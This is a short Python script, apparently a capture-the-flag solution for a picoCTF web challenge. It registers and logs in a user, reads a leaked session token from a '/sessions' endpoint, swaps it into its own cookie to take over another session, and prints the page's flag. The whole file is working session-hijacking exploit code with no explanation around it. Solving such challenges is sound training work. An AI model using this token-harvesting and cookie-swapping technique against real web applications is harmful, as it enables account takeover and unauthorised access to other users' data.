from requests import * 
from bs4 import BeautifulSoup

URL = "http://dolphin-cove.picoctf.net:63669"

def login(s):
    data = {"username":"giuda", "password":"grande"}
    s.post(URL + "/login", data=data)
    return s

def register(s):
    data = {"username":"giuda", "password":"grande", "conf_password":"grande"}
    
    s.post(URL +"/register", data=data)
    return s

def get_sessions(s): 
    sess = (s.get(URL + "/sessions").text).split(":")[1].split(",")[0]
    
    return s, sess


s = Session()
s = register(s)
s = login(s)

s, sess = get_sessions(s)

s.cookies.clear()
s.cookies.set("session", sess)
# s.cookies.set_cookie({"session": sess})
s = BeautifulSoup(s.get(URL).text, "html.parser")
print(s.find("p").text)